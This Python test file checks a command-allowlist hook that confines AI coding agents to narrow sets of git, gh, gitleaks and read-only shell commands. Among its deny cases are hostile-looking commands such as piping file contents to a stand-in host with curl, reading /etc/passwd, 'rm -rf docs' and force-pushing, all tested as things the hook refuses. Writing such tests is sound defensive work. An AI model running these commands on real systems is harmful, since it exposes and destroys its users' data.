# Copyright (c) 2026 Brad Duhon.
# SPDX-License-Identifier: GPL-3.0-or-later
# 0044: the command_allowlist hook; cases copied from tests/test_jail.py run each agent's chain.
from __future__ import annotations

import json
from pathlib import Path

import pytest
from lib import jail
from lib.config import Config

from tests.conftest import CFG, CWD, REPO_ROOT, TRAIN_BRANCH
from tests.hook_chain import (
    decide,
    evaluate,
    first_deny,
    internal_error_denies,
    load,
    malformed_input_denies,
    outside_tools_allow,
    payload,
    run_script,
    unknown_flag_denies,
)
from tests.test_jail import _MANIFEST_LEDGER, _b, _git_init

pytestmark = pytest.mark.usefixtures("jail_fakes")
HOOK = "command_allowlist"


class TestCharterDocs:
    def test_bash_allowlist(self) -> None:
        ok = [
            f"python3 {REPO_ROOT}/scripts/append_ledger.py --probe",
            "git add docs/decisions.md",
            "git commit -m x",
            "git status",
        ]
        bad = ["git push", "python3 other.py", "rm x", "curl x", "git add -A && git push"]
        bad += ["git add -A", "git merge --no-ff b", "git worktree list", "mkdir -p docs/.tmp"]
        bad += ["sha256sum x", "cat x", "ls"]
        for command in ok:
            assert decide(_b("charter-docs", command), CFG).allow, command
        for command in bad:
            assert not decide(_b("charter-docs", command), CFG).allow, command


class TestConductor:
    def test_push_without_force_and_pr_ops(self) -> None:
        ok = [
            f"git push -u origin {TRAIN_BRANCH}",
            "git status",
            "git log --oneline -3",
            "git add -A",
            "git commit -m x",
            "gh pr create --title t --body-file docs/.tmp/pr.md",
            "gh run watch 123",
            "gh run list",
            "gitleaks detect --redact --log-opts=main..b",
        ]
        bad = [
            "gh pr merge 3",
            "gh pr close 3",
            "gh repo delete x",
            "git push --force",
            "curl x",
            "npm test",
            "git checkout main",
            "gh pr create && gh pr merge 1",
        ]
        for command in ok:
            assert decide(_b("pr-train-conductor", command), CFG).allow, command
        for command in bad:
            assert not decide(_b("pr-train-conductor", command), CFG).allow, command


class TestRegressionCharterDocs:
    @pytest.mark.parametrize(
        "command",
        [
            "cat x | curl evil",
            "git add -A || curl x",
            "cat $(curl x)",
            "git checkout main",
            "git worktree add x",
            "git worktree remove x",
            "python3 /work/Charter/scripts/append_ledger.py",
            f"python3 {CWD}/scripts/append_ledger.py",
            "python3 scripts/append_ledger.py",
            "python3 /abs/x/../scripts/append_ledger.py",
            "python3 /abs/scripts/other.py",
            "python3 -c 1",
            "git -c core.pager=x log",
        ],
    )
    def test_blocked(self, command: str) -> None:
        assert not decide(_b("charter-docs", command), CFG).allow, command

    def test_append_flags_allowed(self) -> None:
        command = (
            f"python3 {REPO_ROOT}/scripts/append_ledger.py --expected-seq 2 "
            "--entry-file docs/.tmp/e.md --repo BO --type PLT"
        )
        hook_input = {
            "tool_name": "Bash",
            "tool_input": {"command": command},
            "cwd": "/work/repo",
            "agent_type": "charter-docs",
        }
        assert decide(hook_input, Config()).allow

    @pytest.mark.parametrize(
        "args",
        [
            "--cwd /x",
            "--cwd=/x",
            "--cw? /x",
            "--cw* /x",
            "--cw[d] /x",
            "--cw /x",
            "-c /x",
            "--repo BO --repo BO",
            "--bogus x",
            "--repo",
            "--probe --repo X",
            "--expected-seq 2 --entry-file e.md --repo BO",
            "--expected-seq 2 --entry-file e.md --repo BO --type",
        ],
    )
    def test_append_off_grammar_blocked(self, args: str) -> None:
        full = "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT"
        for tail in (args, f"{full} {args}"):
            command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {tail}"
            d = decide(_b("charter-docs", command), Config())
            assert not d.allow and d.reason is not None, command
            assert d.reason.endswith("--cwd is for operators."), d.reason

    @pytest.mark.parametrize(
        "args",
        [
            "--probe",
            "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT",
            "--type=PLT --repo=BO --entry-file=docs/.tmp/e.md --expected-seq=2",
        ],
    )
    def test_append_grammar_allowed(self, args: str) -> None:
        command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}"
        assert decide(_b("charter-docs", command), Config()).allow, command

    def test_repo_scripts_ledger_allowed(self) -> None:
        args = "--expected-seq 2 --entry-file docs/.tmp/e.md --repo BO --type PLT"
        command = f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}"
        assert decide(_b("charter-docs", command), CFG).allow
        assert not decide(_b("charter-docs", "git worktree list --porcelain"), CFG).allow

    @pytest.mark.parametrize(
        "script", ["/tmp/x/scripts/append_ledger.py", "/work/Charter/scripts/append_ledger.py"]
    )
    def test_foreign_append_ledger_blocked(self, script: str) -> None:
        assert not decide(_b("charter-docs", f"python3 {script}"), CFG).allow


class TestRound3SortPytestGitleaks:
    def test_gitleaks_report_path(self) -> None:
        conductor = "pr-train-conductor"
        for form in ("--report-path=/tmp/r.json", "--report-path /tmp/r.json"):
            assert decide(_b(conductor, f"gitleaks detect --redact {form}"), CFG).allow
        for command in (
            "gitleaks detect --report-path /var/x/r.json",
            "gitleaks detect -r /etc/x",
            "gitleaks detect --report-path=/tmp/../etc/x",
            "gitleaks detect --log-opts=--output=/x",
            "gitleaks detect --report-path=r.json",
        ):
            assert not decide(_b(conductor, command), CFG).allow, command


class TestRound4Conductor:
    @pytest.mark.parametrize(
        "command",
        [
            "gitleaks detect -r/work/repo/src/a.py",
            "gitleaks detect -vr/work/repo/src/a.py",
            "git push origin Main",
            "git push origin MASTER",
            "git push -u origin mAsTeR",
        ],
    )
    def test_blocked(self, command: str) -> None:
        assert not decide(_b("pr-train-conductor", command), CFG).allow, command

    @pytest.mark.parametrize(
        "command",
        [
            "gitleaks detect --redact -r /tmp/x.json",
            "gitleaks detect --redact -r=/tmp/x.json",
            "gitleaks detect --redact -r/tmp/x.json",
            "gitleaks detect --redact --report-path /tmp/x.json",
            f"git push origin {TRAIN_BRANCH}",
        ],
    )
    def test_allowed(self, command: str) -> None:
        assert decide(_b("pr-train-conductor", command), CFG).allow, command


class TestFixWaveLedgerResolution:
    def test_append_ledger_cli_still_allowed(self, tmp_path: Path) -> None:
        repo = _git_init(tmp_path / "repo")
        (repo / "service-manifest.json").write_text(json.dumps({"ledger": _MANIFEST_LEDGER}))
        args = "--expected-seq 1 --entry-file docs/.tmp/e.md --repo BO --type PLT"
        hook_input = _b("charter-docs", f"python3 {REPO_ROOT}/scripts/append_ledger.py {args}")
        hook_input["cwd"] = str(repo)
        assert decide(hook_input, Config()).allow


class TestFixWaveGitleaksRedact:
    C = "pr-train-conductor"

    @pytest.mark.parametrize(
        "command",
        [
            'gitleaks detect --log-opts="abc..daedalus/T"',
            "gitleaks detect",
            "gitleaks detect --redact=50 --log-opts=abc..daedalus/T",
            "gitleaks detect --redact=0",
            "gitleaks detect --log-opts --redact",
        ],
    )
    def test_unredacted_blocked(self, command: str) -> None:
        d = decide(_b(self.C, command), CFG)
        assert not d.allow and d.reason is not None, command
        assert "Next: rerun it as gitleaks detect --redact" in d.reason

    @pytest.mark.parametrize(
        "command",
        [
            'gitleaks detect --redact --log-opts="abc..daedalus/T"',
            "gitleaks detect --log-opts=abc..daedalus/T --redact",
            "gitleaks detect --redact=100 --log-opts=abc..daedalus/T",
        ],
    )
    def test_redacted_allowed(self, command: str) -> None:
        assert decide(_b(self.C, command), CFG).allow, command


class TestFixWaveCharterDocsBash:
    @pytest.mark.parametrize(
        "command",
        [
            "git merge --no-ff x",
            "git merge --no-ff -m x b",
            "git -C /work/Charter add -A",
            "git add -A",
            "git add --all",
            "git add -u",
            "git add .",
            "git add ./",
            "git add docs/",
            "git add -- .",
            "git add docs/.",
            "git add :/",
            "git add -f docs/a.md",
            "git add",
            "git commit -am x",
            "git commit -F docs/.tmp/msg.txt",
            "git commit -m x -- docs/a.md",
            "git commit -q -m x",
            "git worktree list",
            "git branch",
            "git rev-parse HEAD",
            "mkdir -p docs/.tmp",
            "cat src/a.md",
            "ls src",
            "sha256sum x",
        ],
    )
    def test_blocked(self, command: str) -> None:
        d = decide(_b("charter-docs", command), CFG)
        assert not d.allow and d.reason is not None, command
        assert "Next:" in d.reason

    @pytest.mark.parametrize(
        "command",
        [
            "git add docs/decisions.md",
            "git add -- docs/a.md docs/b.md",
            "git commit -m x",
            "git status",
            "git log --oneline -3",
            "git diff --cached",
            "git -C /work/Charter add decision-log.md",
            "git -C /work/Charter commit -m x",
            "git -C /work/Charter status --porcelain",
            "git -C /work/Charter log -n 1",
            "git -C /work/Charter diff --stat",
        ],
    )
    def test_allowed(self, command: str) -> None:
        assert decide(_b("charter-docs", command), CFG).allow, command


def test_command_allowlist_judges_the_hook_alone() -> None:
    docs = ("--allow", "append_ledger,git,read")
    assert evaluate(HOOK, _b("x", "git push"), *docs) is None
    assert evaluate(HOOK, _b("x", "ls"), *docs) == jail.R_DOCS_BASH
    ledger = f"python3 {REPO_ROOT}/scripts/append_ledger.py --cwd /x"
    assert evaluate(HOOK, _b("x", ledger), *docs) == jail.R_LEDGER_ARGS
    mover = ("--allow", "git,gh,gitleaks")
    assert evaluate(HOOK, _b("x", "gh pr merge 1"), *mover) is None
    assert evaluate(HOOK, _b("x", "gitleaks detect"), *mover) == jail.R_GITLEAKS
    assert evaluate(HOOK, _b("x", "npm test"), *mover) == jail.R_CONDUCTOR_BASH
    want = "Bash is limited to git. Next: use those only."
    assert evaluate(HOOK, _b("x", "ls"), "--allow", "git") == want
    assert evaluate(HOOK, _b("x", "git status")) is not None


def test_command_allowlist_fixture_decisions() -> None:
    mover = ("--allow", "git,gh,gitleaks")
    ls = payload("Bash", agent="pr-train-conductor", command="ls")
    assert run_script(HOOK, ls, *mover) == {"decision": "deny", "reason": jail.R_CONDUCTOR_BASH}
    ok = payload("Bash", agent="pr-train-conductor", command="git status && gh run list")
    assert run_script(HOOK, ok, *mover) == {"decision": "allow", "reason": ""}
    leak = payload("Bash", agent="pr-train-conductor", command="gitleaks detect")
    assert run_script(HOOK, leak, *mover) == {"decision": "deny", "reason": jail.R_GITLEAKS}


def test_command_allowlist_allows_tools_outside_its_tools() -> None:
    outside_tools_allow(HOOK, "Write", "--allow", "git")


def test_command_allowlist_unknown_flag_denies() -> None:
    unknown_flag_denies(HOOK, payload("Bash", command="git status"), "--allow", "git")


def test_command_allowlist_malformed_input_denies() -> None:
    malformed_input_denies(HOOK, "--allow", "git")


def test_command_allowlist_internal_error_denies_and_names_the_hook() -> None:
    internal_error_denies(HOOK, payload("Bash", command="git status"), "--allow", "git")


# 0084: charter-docs reads under the charter root and the project's docs/, never wider.
ENTRY = f"{CWD}/docs/.tmp/daedalus/20261018-234006/entry.md"


@pytest.mark.parametrize(
    "command",
    [
        f"cat {ENTRY}",
        "cat docs/.tmp/daedalus/20261018-234006/entry.md",
        "cat -n docs/.tmp/daedalus/20261018-234006/entry.md",
        "head -n 20 docs/.tmp/daedalus/20261018-234006/entry.md",
        "tail -n5 docs/decisions.md",
        "wc -l docs/decisions.md",
        "ls docs/.tmp/daedalus",
        "ls -la /work/Charter",
        "diff docs/a.md /work/Charter/a.md",
        "sed -n 1,20p docs/decisions.md",
        "sed -n -e 3p -e /0084/p docs/decisions.md",
        "cat docs/a.md && git status",
    ],
)
def test_charter_docs_may_cat_its_entry_file(command: str) -> None:
    assert decide(_b("charter-docs", command), CFG).allow, command


@pytest.mark.parametrize(
    "command",
    [
        'grep -n "0084-DAE" /work/Charter/decision-log.md',
        "grep -F 'row [x] *' /work/Charter/decision-log.md",
        "grep -c -e 0084 -e 0083 docs/decisions.md",
        "grep -rn 0084 docs/.tmp/daedalus",
        "grep -A2 -m1 0084 -- /work/Charter/decision-log.md",
    ],
)
def test_charter_docs_may_grep_the_ledger(command: str) -> None:
    assert decide(_b("charter-docs", command), CFG).allow, command


@pytest.mark.parametrize(
    "command",
    [
        "cat /etc/passwd",
        "cat src/a.py",
        "cat docs/../src/a.py",
        f"cat {CWD}/docs/../src/a.py",
        "cat /work/Charterx/a.md",
        "cat docs/*.md",
        "cat 'docs/*.md'",
        "ls",
        "ls /work",
        "grep -r 0084",
        "grep 0084 src/a.py",
        "grep -e 0084 docs/a.md /etc/passwd",
        "grep -R 0084 docs",
        "grep -f /etc/passwd docs/a.md",
        "grep 0084 docs/*",
        "grep /etc/pass* docs/a.md",
        "grep --include=x 0084 docs",
        "grep 0084 docs/a.md && cat /etc/passwd",
        "head -n 5 /work/repo/src/a.py",
        "tail -f docs/a.md",
        "wc --files0-from=/etc/x",
        "wc -l",
        "diff docs/a.md src/a.py",
        "diff -r docs /work/Charter",
        "sed -n 1p /etc/passwd",
        "sha256sum docs/a.md",
        "find docs",
    ],
)
def test_charter_docs_read_outside_the_charter_docs_or_scratch_is_refused(command: str) -> None:
    d = decide(_b("charter-docs", command), CFG)
    assert not d.allow and d.reason is not None, command
    assert "Next:" in d.reason


def test_charter_docs_relative_path_resolves_against_the_project_root(tmp_path: Path) -> None:
    repo = _git_init(tmp_path / "repo")
    scratch = repo / "docs" / ".tmp" / "daedalus" / "t1"
    scratch.mkdir(parents=True)

    def at(cwd: Path, command: str) -> bool:
        hook_input = _b("charter-docs", command)
        hook_input["cwd"] = str(cwd)
        return decide(hook_input, CFG).allow

    assert at(repo, "cat docs/decisions.md")
    assert at(scratch, "cat docs/decisions.md")
    # 0084: from the scratch dir src/ would sit under docs/, but the project root decides.
    assert not at(scratch, "cat src/a.py")
    assert not at(repo, "cat src/a.py")
    assert not at(scratch, "cat ../../../../src/a.py")
    assert at(scratch, f"cat {repo}/docs/decisions.md")


@pytest.mark.parametrize(
    ("command", "allow"),
    [
        (f"python3 {REPO_ROOT}/scripts/append_ledger.py --probe", True),
        ("git add docs/decisions.md", True),
        ("git commit -m x", True),
        ("git status", True),
        ("git log --oneline -3", True),
        ("git diff --cached", True),
        ("git add -A", False),
        ("git merge --no-ff x", False),
        ("cp docs/a.md docs/b.md", False),
        ("tee docs/a.md", False),
        ("touch docs/a.md", False),
        ("mkdir -p docs/.tmp", False),
        ("rm docs/a.md", False),
        ("sed -i -n 1p docs/a.md", False),
        ("sed -ni 1p docs/a.md", False),
        ("sed -n --in-place 1p docs/a.md", False),
        ("sed -n 1w/tmp/x docs/a.md", False),
        ("sed -n '1p;w/tmp/x' docs/a.md", False),
        ("sed -n 1e docs/a.md", False),
        ("sed -n s/a/b/w docs/a.md", False),
        ("python3 /abs/scripts/other.py", False),
    ],
)
def test_charter_docs_writes_are_unchanged(command: str, allow: bool) -> None:
    assert decide(_b("charter-docs", command), CFG).allow is allow, command


def test_charter_docs_quoted_sed_write_is_refused_by_the_script_grammar() -> None:
    # 0084: one quoted segment, so the p-only sed grammar refuses it, not segment splitting.
    flags = ("--allow", "append_ledger,git,read")
    assert first_deny(_b("charter-docs", "sed -n '1p;w/tmp/x' docs/a.md"), CFG) == (
        HOOK,
        jail.R_DOCS_BASH,
    )
    assert "sed -n" in jail.R_DOCS_BASH
    assert evaluate(HOOK, _b("charter-docs", "sed -n '1p;2p' docs/a.md"), *flags) is None


@pytest.mark.parametrize(
    "command",
    [
        "sed 1,20p docs/decisions.md",
        "sed -e 1p docs/decisions.md",
        "sed -E 1p docs/decisions.md",
        "sed --quiet 1p docs/decisions.md",
        "sed -n docs/decisions.md",
        "sed -n 1,20p",
        "sed -n 1d docs/decisions.md",
        "sed -f docs/a.sed -n docs/decisions.md",
    ],
)
def test_charter_docs_sed_without_dash_n_is_refused(command: str) -> None:
    assert not decide(_b("charter-docs", command), CFG).allow, command


def test_charter_docs_read_refusal_names_the_reads() -> None:
    reason = evaluate(
        HOOK, _b("charter-docs", "cat /etc/hosts"), "--allow", "append_ledger,git,read"
    )
    assert reason == jail.R_DOCS_BASH
    for word in ("cat", "grep", "head", "tail", "wc", "ls", "diff", "sed -n", "docs/"):
        assert word in reason, word


SCRIPTS = REPO_ROOT / "scripts"
ORCHESTRATOR_OK = [
    f"python3 {SCRIPTS}/daedalus_train.py progress --repo {CWD}",
    f'python3 {SCRIPTS}/daedalus_train.py choice --repo {CWD} --chose "a" --over "b" --cost "c"',
    f"python3 {SCRIPTS}/daedalus_train.py verdict --repo {CWD} --status approved --round 1",
    f"python3 {SCRIPTS}/daedalus_workspace.py create --repo {CWD} --name t-u1 --base daedalus/t",
    f"python3 {SCRIPTS}/daedalus_workspace.py lock --repo {CWD} --contract c.md --version 1",
    f"python3 {SCRIPTS}/daedalus_workspace.py finish --repo {CWD}",
    f"python3 {SCRIPTS}/daedalus_workspace.py refresh --repo {CWD} --name t-audit",
    f"python3 {SCRIPTS}/daedalus_train.py model --repo {CWD} --agent repo-coder",
    f"python3 {SCRIPTS}/daedalus_doctor.py --print-cache-dir",
    f"python3 {SCRIPTS}/audit_report.py --repo {CWD} --session s --controls",
    f"python3 {SCRIPTS}/validate_plan.py {CWD}/docs/.tmp/daedalus/t/plan.md --max-concurrent 5",
    "git merge-base --is-ancestor abc daedalus-unit/t-u1",
    "git status",
    f"cat {CWD}/docs/.tmp/daedalus/t/plan.md",
    f"sha256sum {CWD}/contracts/c.md",
]


def test_orchestrator_bash_runs_its_scripts_and_reads() -> None:
    # 0060, pin B6 -> B4: the train scripts pass shell_tripwires and command_allowlist together.
    for command in ORCHESTRATOR_OK:
        assert decide(_b("orchestrator", command), CFG).allow, command


@pytest.mark.parametrize(
    "command",
    [
        "git push origin daedalus/t",
        "gh pr create --title t --body-file x",
        "git merge --no-ff daedalus-unit/t-u1",
        "git switch main",
        "git commit -m x",
        "rm -rf docs",
        "claude -p hi",
        f"python3 {SCRIPTS}/daedalus_workspace.py stop --repo {CWD} --reason r",
        f"python3 {SCRIPTS}/daedalus_workspace.py resume --repo {CWD}",
        f"python3 {SCRIPTS}/daedalus_workspace.py begin --repo {CWD}",
        f"python3 {SCRIPTS}/daedalus_workspace.py release --repo {CWD} --merge-sha abc",
        f"python3 {SCRIPTS}/daedalus_train.py stop --repo {CWD} --reason r",
        f"python3 {SCRIPTS}/daedalus_train.py exception --repo {CWD} --ledger-id 0109-DAE-PLT",
        f"python3 {SCRIPTS}/daedalus_doctor.py",
        f"python3 {SCRIPTS}/append_ledger.py --probe",
        f"python3 {SCRIPTS}/verify_audit_chain.py --hooks-live --repo {CWD}",
        f"python3 {SCRIPTS}/../scripts/daedalus_train.py progress --repo {CWD}",
        f"python3 {CWD}/scripts/daedalus_train.py progress --repo {CWD}",
        f"PYTHONPATH=/tmp python3 {SCRIPTS}/daedalus_train.py progress --repo {CWD}",
        f"/usr/bin/python3 {SCRIPTS}/daedalus_train.py progress --repo {CWD}",
        "python3 -c 'print(1)'",
        f"python3 {SCRIPTS}/daedalus_train.py progress --repo {CWD} > {CWD}/docs/x",
    ],
)
def test_orchestrator_bash_refuses_everything_else(command: str) -> None:
    # 0001, 0060: no push, gh, merge, stop, resume or other script; nested claude stays refused.
    assert not decide(_b("orchestrator", command), CFG).allow, command


def test_orchestrator_bash_refusal_names_its_grant() -> None:
    reason = evaluate(HOOK, _b("orchestrator", "rm x"), "--allow", "train,inspect")
    assert reason == load(HOOK).R_ORCHESTRATOR_BASH
    for word in ("daedalus_train.py", "finish", "read-only inspection", "Next:"):
        assert word in str(reason), word


def test_shell_exemption_is_the_orchestrators_alone() -> None:
    # pin B6 -> B4: the R_INLINE exemption names the orchestrator; no other agent runs these.
    command = f"python3 {SCRIPTS}/daedalus_train.py progress --repo {CWD}"
    assert evaluate("shell_tripwires", _b("orchestrator", command)) is None
    for agent in ("repo-coder", "security-auditor", "pr-train-conductor", "charter-docs"):
        assert evaluate("shell_tripwires", _b(agent, command)) is not None, agent


# issue 63, pin C3 -> C4: a train script's --repo or --cwd is the project root of the hook cwd.
TRAIN_FLAGS = ("--allow", "train,inspect")
REFRESH = f"python3 {SCRIPTS}/daedalus_workspace.py refresh"


def test_refresh_is_the_orchestrators() -> None:
    command = f"{REFRESH} --repo {CWD} --name t-audit"
    assert decide(_b("orchestrator", command), CFG).allow
    assert "refresh" in load(HOOK).TRAIN_SCRIPTS["daedalus_workspace.py"]
    assert "model" in load(HOOK).TRAIN_SCRIPTS["daedalus_train.py"]
    assert "refresh" in load(HOOK).R_ORCHESTRATOR_BASH
    for agent in ("repo-coder", "security-auditor", "charter-docs", "pr-train-conductor"):
        assert not decide(_b(agent, command), CFG).allow, agent


@pytest.mark.parametrize(
    ("args", "flag", "given"),
    [
        ("--repo /work/other --name t-audit", "--repo", "/work/other"),
        ("--repo=/work/other --name t-audit", "--repo", "/work/other"),
        (f"--repo {CWD} --name t-audit --repo /work/other", "--repo", "/work/other"),
        (f"--repo {CWD}/docs --name t-audit", "--repo", f"{CWD}/docs"),
        ("--repo .. --name t-audit", "--repo", ".."),
    ],
)
def test_train_script_repo_outside_the_project_root_is_refused(
    args: str, flag: str, given: str
) -> None:
    reason = evaluate(HOOK, _b("orchestrator", f"{REFRESH} {args}"), *TRAIN_FLAGS)
    assert reason == load(HOOK).R_TRAIN_REPO.format(flag=flag, given=given, root=CWD)
    assert given in str(reason) and f"({CWD})" in str(reason)
    assert not decide(_b("orchestrator", f"{REFRESH} {args}"), CFG).allow


def test_train_script_cwd_flag_is_judged_the_same_way() -> None:
    report = f"python3 {SCRIPTS}/audit_report.py --cwd /work/other --session s"
    reason = evaluate(HOOK, _b("orchestrator", report), *TRAIN_FLAGS)
    assert reason == load(HOOK).R_TRAIN_REPO.format(flag="--cwd", given="/work/other", root=CWD)
    ok = f"python3 {SCRIPTS}/audit_report.py --cwd {CWD} --session s"
    assert evaluate(HOOK, _b("orchestrator", ok), *TRAIN_FLAGS) is None


@pytest.mark.parametrize("args", ["--rep /work/other", "--re=/work/other", "--repo", "--cw /x"])
def test_train_script_abbreviated_or_empty_repo_is_refused(args: str) -> None:
    command = f"python3 {SCRIPTS}/daedalus_train.py progress {args}"
    assert evaluate(HOOK, _b("orchestrator", command), *TRAIN_FLAGS) is not None, args


@pytest.mark.parametrize(
    "args", [f"--repo {CWD}", f"--repo={CWD}", f"--repo {CWD}/", "--repo .", f"--repo {CWD}/x/.."]
)
def test_train_script_repo_equal_to_the_project_root_is_admitted(args: str) -> None:
    command = f"{REFRESH} {args} --name t-audit"
    assert evaluate(HOOK, _b("orchestrator", command), *TRAIN_FLAGS) is None, args


def test_train_script_repo_resolves_from_a_subfolder_of_a_real_project(tmp_path: Path) -> None:
    repo = _git_init(tmp_path / "repo")
    (repo / ".claude" / "daedalus").mkdir(parents=True)
    (repo / "docs").mkdir()
    hook_input = _b("orchestrator", f"{REFRESH} --repo {repo} --name t-audit")
    hook_input["cwd"] = str(repo / "docs")
    assert evaluate(HOOK, hook_input, *TRAIN_FLAGS) is None
    hook_input["tool_input"] = {"command": f"{REFRESH} --repo {repo}/docs --name t-audit"}
    reason = evaluate(HOOK, hook_input, *TRAIN_FLAGS)
    assert reason is not None and f"{repo}/docs" in reason and f"({repo})" in reason


def test_train_script_ok_keeps_its_shape_check_without_a_cwd() -> None:
    # pin B6 -> B4: shell_tripwires calls it with the segment alone.
    module = load(HOOK)
    segment = ["python3", f"{SCRIPTS}/daedalus_train.py", "progress", "--repo", "/work/other"]
    assert module.train_script_ok(segment)
    assert not module.train_script_ok(segment, CWD)
    assert module.train_script_ok([*segment[:3], "--repo", CWD], CWD)
